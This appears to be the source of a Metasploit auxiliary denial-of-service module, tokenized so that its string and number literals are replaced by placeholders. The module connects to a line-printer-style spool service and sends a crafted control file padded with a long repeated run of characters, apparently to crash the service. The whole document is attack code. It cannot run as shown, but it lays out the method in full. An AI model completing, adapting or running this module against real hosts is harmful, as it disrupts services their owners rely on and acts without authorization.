require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: Tcp include Msf :: Auxiliary :: Dos def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptString . new ( <str> , [ true , <str> ] ) , ] , self . class ) end def run r_hostname = Rex :: Text . rand_text_alpha ( rand ( <int> ) + <int> ) r_user = Rex :: Text . rand_text_alpha ( rand ( <int> ) + <int> ) r_spool = Rex :: Text . rand_text_alpha ( rand ( <int> ) + <int> ) control = <str> r_hostname <str> r_user <str> ; jid = ( $$ % <int> ) . to_s + [ Time . now . to_i ] . pack ( <str> ) . unpack ( <str> ) [ <int> ] sock1 = connect ( false ) sock1 . put ( <str> r_hostname <str> r_spool <str> ) res = sock1 . get_once if ( not res ) print_status ( <str> ) return end control << <str> + ( <str> * <int> ) + <str> datastore [ <str> ] <str> dataf = Rex :: Text . rand_text_alpha ( <int> ) + <int> print_status ( <str> datastore [ <str> ] <str> ) if ! ( send_file ( sock1 , <int> , <str> + jid + r_hostname , control ) and send_file ( sock1 , <int> , <str> + jid + r_hostname , dataf ) ) sock1 . close return end print_status ( <str> datastore [ <str> ] <str> ) sock1 . close end def send_file ( s , type , name , data = <str> ) s . put ( type . chr + data . length . to_s + <str> + name + <str> ) res = s . get_once ( <int> ) if ! ( res and res [ <int> ] == <str> ) print_status ( <str> name <str> ) return end s . put ( data ) s . put ( <str> ) res = s . get_once ( <int> ) if ! ( res and res [ <int> ] == <str> ) print_status ( <str> name <str> ) return end print_status ( sprintf ( <str> name <str> , data . length ) ) return true end end 
